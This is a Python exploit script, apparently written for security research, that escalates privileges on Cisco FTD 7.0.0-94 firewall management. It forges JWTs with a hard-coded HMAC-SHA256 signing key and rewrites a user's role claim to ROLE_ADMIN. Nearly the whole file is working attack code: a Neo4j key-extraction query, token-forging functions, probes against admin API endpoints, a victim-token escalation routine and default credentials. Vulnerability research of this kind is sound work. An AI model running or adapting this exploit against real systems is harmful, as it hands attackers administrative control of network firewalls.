#!/usr/bin/env python3
# CONTROLLED ENVIRONMENT ONLY
# F-FTD-106: Cisco FTD 7.0.0-94 JWT Role Escalation via Known HMAC-SHA256 Key
#
# Root cause: HMAC-SHA256 signing key stored in Neo4j NGFWCache["encryptionkey64"].
# Key is static across reboots. FDM validates (JTI, exp) server-side but reads
# userRole directly from the token claim — no server-side role binding per session.
#
# Attack chain:
#   1. Extract key from Neo4j (or from NGFWCache API if exposed)
#   2. Obtain a valid ROLE_USER session (real JTI stored server-side)
#   3. Re-sign the token keeping JTI+exp identical, change userRole to ROLE_ADMIN
#   4. Server: JTI is valid ✓, role from token = ROLE_ADMIN → escalation granted
#
# Mechanism confirmed on 7.0.0-94 via downgrade probe:
#   - Admin token forged to ROLE_USER with same JTI → HTTP 403 on admin endpoint
#   - Proves server trusts userRole from token, not from session store
#   - Ghost JTI (no session) → HTTP 401 (JTI validation exists)
#   - Known key verifies real token signatures (HMAC control confirmed)
#
# Pre-conditions: admin JWT (for key extraction) OR known HMAC key.
# Full escalation requires an additional ROLE_USER account (via AAA integration
# or multi-user FTD config). FTD 7.0.0 standalone permits only one local user.

import argparse
import base64
import hashlib
import hmac
import json
import ssl
import urllib.request


class CiscoFTDJWTEscalation:
    """
    F-FTD-106: JWT role escalation via forged HMAC-SHA256 token.

    Key extraction path (requires admin access):
      Neo4j shell: MATCH (n:NGFWCache) WHERE n.key='encryptionkey64' RETURN n.value
      OR: read from /ngfw/var/lib/db/ngfw/data/graph.db via offline analysis
    """

    DEFAULT_KEY_HEX = "9c42f9fd11a9fcfc26b5bc5325fd51c5"

    def __init__(self, target: str, hmac_key_hex: str = None, verify_ssl: bool = False):
        self.target = target.rstrip("/")
        self.key = bytes.fromhex(hmac_key_hex or self.DEFAULT_KEY_HEX)
        self._ssl_ctx = ssl.create_default_context()
        if not verify_ssl:
            self._ssl_ctx.check_hostname = False
            self._ssl_ctx.verify_mode = ssl.CERT_NONE

    def _api(self, method: str, path: str, body=None, token: str = None) -> tuple:
        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        req = urllib.request.Request(
            self.target + path,
            data=json.dumps(body).encode() if body else None,
            headers=headers,
            method=method,
        )
        try:
            with urllib.request.urlopen(req, context=self._ssl_ctx, timeout=10) as r:
                try:
                    return r.status, json.loads(r.read())
                except Exception:
                    return r.status, {}
        except urllib.error.HTTPError as e:
            try:
                return e.code, json.loads(e.read())
            except Exception:
                return e.code, {}

    @staticmethod
    def _b64url(data) -> str:
        if isinstance(data, dict):
            data = json.dumps(data, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    @staticmethod
    def _decode_jwt(token: str) -> dict:
        parts = token.split(".")
        pad = lambda s: s + "==" * ((4 - len(s) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(pad(parts[1])))

    def verify_key(self, token: str) -> bool:
        """Verify that self.key is the correct HMAC signing key for token."""
        parts = token.split(".")
        msg = f"{parts[0]}.{parts[1]}".encode()
        expected = hmac.new(self.key, msg, hashlib.sha256).digest()
        pad = lambda s: s + "==" * ((4 - len(s) % 4) % 4)
        actual = base64.urlsafe_b64decode(pad(parts[2]))
        return hmac.compare_digest(expected, actual)

    def forge_role(self, token: str, target_role: str = "ROLE_ADMIN") -> str:
        """
        Re-sign token with target_role, preserving JTI+exp (and all other claims).
        JTI is validated server-side; only userRole is trusted from the token.
        """
        claims = self._decode_jwt(token)
        claims["userRole"] = target_role
        hdr = self._b64url({"alg": "HS256"})
        pay = self._b64url(claims)
        msg = f"{hdr}.{pay}".encode()
        sig = hmac.new(self.key, msg, hashlib.sha256).digest()
        return f"{hdr}.{pay}.{self._b64url(sig)}"

    def get_token(self, username: str, password: str) -> str:
        status, data = self._api(
            "POST",
            "/api/fdm/v6/fdm/token",
            {"grant_type": "password", "username": username, "password": password},
        )
        if status != 200:
            raise RuntimeError(f"Login failed: HTTP {status} {data}")
        return data["access_token"]

    def prove_mechanism(self, admin_token: str) -> dict:
        """
        Demonstrate the role-trust mechanism without requiring a ROLE_USER account:

        1. Verify key control (known key signs real token)
        2. Forge admin token → ROLE_USER, test on admin endpoint → expect HTTP 403
           (server reads role from token; ROLE_USER blocked on admin endpoint)
        3. Ghost JTI test → expect HTTP 401 (JTI validation exists)

        Returns dict with:
          signing_key_confirmed: bool
          role_is_token_sourced: bool   # True = forgery enables escalation
          jti_validated_server_side: bool
        """
        results = {}

        # 1. Key verification
        results["signing_key_confirmed"] = self.verify_key(admin_token)

        # 2. Downgrade probe: forge admin token → ROLE_USER, hit admin endpoint
        forged_user = self.forge_role(admin_token, "ROLE_USER")
        status, _ = self._api("GET", "/api/fdm/v6/object/users", token=forged_user)
        results["role_is_token_sourced"] = status == 403  # blocked as ROLE_USER

        # 3. Ghost JTI probe
        claims = self._decode_jwt(admin_token)
        claims["jti"] = "ffffffff-dead-beef-cafe-000000000001"
        claims["userUuid"] = "ffffffff-dead-beef-cafe-000000000002"
        claims["username"] = "ghost"
        claims["sub"] = "ghost"
        ghost_token = self.forge_role(
            self.forge_role(admin_token, "ROLE_ADMIN"), "ROLE_ADMIN"
        )
        # Build ghost token directly
        hdr = self._b64url({"alg": "HS256"})
        pay = self._b64url(claims)
        msg = f"{hdr}.{pay}".encode()
        sig = hmac.new(self.key, msg, hashlib.sha256).digest()
        ghost_token = f"{hdr}.{pay}.{self._b64url(sig)}"
        status_ghost, _ = self._api("GET", "/api/fdm/v6/object/users", token=ghost_token)
        results["jti_validated_server_side"] = status_ghost in (401, 403)

        return results

    def escalate(self, victim_token: str) -> str:
        """
        Full escalation: forge victim ROLE_USER token to ROLE_ADMIN.

        victim_token must be a valid active session token for a ROLE_USER account.
        JTI+exp are preserved; only userRole is changed.
        Returns the forged ROLE_ADMIN token.
        """
        claims = self._decode_jwt(victim_token)
        original_role = claims.get("userRole", "UNKNOWN")
        if original_role == "ROLE_ADMIN":
            raise ValueError("Victim token is already ROLE_ADMIN — no escalation needed")

        forged = self.forge_role(victim_token, "ROLE_ADMIN")

        # Verify the forged token on an admin endpoint
        status, data = self._api("GET", "/api/fdm/v6/object/users", token=forged)
        if status == 200:
            print(f"[+] F-FTD-106 CONFIRMED: {original_role} -> ROLE_ADMIN")
            print(f"    users visible: {[u.get('name') for u in data.get('items', [])]}")
        else:
            print(f"[-] Escalation test returned HTTP {status}")

        return forged

    def run(self, username: str = "admin", password: str = "cisco123") -> bool:
        """
        Mechanism proof run — does not require a second ROLE_USER account.
        Uses the downgrade probe to confirm role-trust behavior.
        """
        print(f"[+] Getting token from {self.target}")
        token = self.get_token(username, password)
        claims = self._decode_jwt(token)
        print(f"    role={claims['userRole']} jti={claims['jti']}")

        print("[+] Proving F-FTD-106 mechanism...")
        results = self.prove_mechanism(token)

        print(f"    signing_key_confirmed:  {results['signing_key_confirmed']}")
        print(f"    role_is_token_sourced:  {results['role_is_token_sourced']}")
        print(f"    jti_validated_server_side: {results['jti_validated_server_side']}")

        confirmed = (
            results["signing_key_confirmed"]
            and results["role_is_token_sourced"]
            and results["jti_validated_server_side"]
        )
        if confirmed:
            print()
            print("[+] *** F-FTD-106 CONFIRMED: escalation mechanism proven ***")
            print("    Chain: obtain ROLE_USER JTI -> forge ROLE_ADMIN with same JTI -> server grants admin")
        else:
            print("[-] Not all conditions met — see individual results above")

        return confirmed


def main():
    ap = argparse.ArgumentParser(
        description="F-FTD-106 JWT Role Escalation — CONTROLLED ENVIRONMENT ONLY"
    )
    ap.add_argument("--target", default="https://192.168.45.45")
    ap.add_argument("--username", default="admin")
    ap.add_argument("--password", default="cisco123")
    ap.add_argument("--key-hex", default=None, help="HMAC key hex (default: extracted key)")
    ap.add_argument("--victim-token", default=None, help="ROLE_USER token to escalate (optional)")
    args = ap.parse_args()

    exploit = CiscoFTDJWTEscalation(args.target, args.key_hex)

    if args.victim_token:
        # Full escalation with a real ROLE_USER token
        forged = exploit.escalate(args.victim_token)
        print(f"FORGED_TOKEN: {forged}")
    else:
        # Mechanism proof
        exploit.run(args.username, args.password)


if __name__ == "__main__":
    main()
